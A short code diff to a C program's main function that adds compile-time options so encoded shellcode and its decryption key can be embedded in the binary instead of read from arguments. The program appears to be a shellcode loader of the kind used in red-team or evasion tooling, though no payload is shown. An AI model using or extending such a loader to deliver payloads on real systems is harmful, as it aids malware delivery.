@@ -86,7 +86,12 @@ int main (int argc, char **argv)
 	
 	// Retrieve encoded shellcode
 	int shellcode_size = 0;
+	// If shellcode is retrieved statically, set the argument acoordingly to ensure that the correct data is delivered
+	#ifdef STATIC_SHELLCODE	
+	unsigned char *encoded_shellcode = get_shellcode("static_shellcode", &shellcode_size);
+	#else
 	unsigned char *encoded_shellcode = get_shellcode(argv[1], &shellcode_size);
+	#endif
 	if(encoded_shellcode != NULL) {
 		DEBUG_PRINT(("Retrieved shellcode data, size is %d bytes.\n", shellcode_size));
 	} else {
@@ -95,7 +100,12 @@ int main (int argc, char **argv)
 	
 	// Retrieve crypto key
 	int key_length = 0;
+	// If key is retrieved statically, set the argument accordingly to ensure that the correct data is delivered
+	#ifdef STATIC_KEY
+	unsigned char *key = get_key("static_key", &key_length);
+	#else
 	unsigned char *key = get_key(argv[2], &key_length);
+	#endif
 	if(key != NULL) {
 		DEBUG_PRINT(("Retrieved key data, key length is %d bytes.\n", key_length));
 	} else {
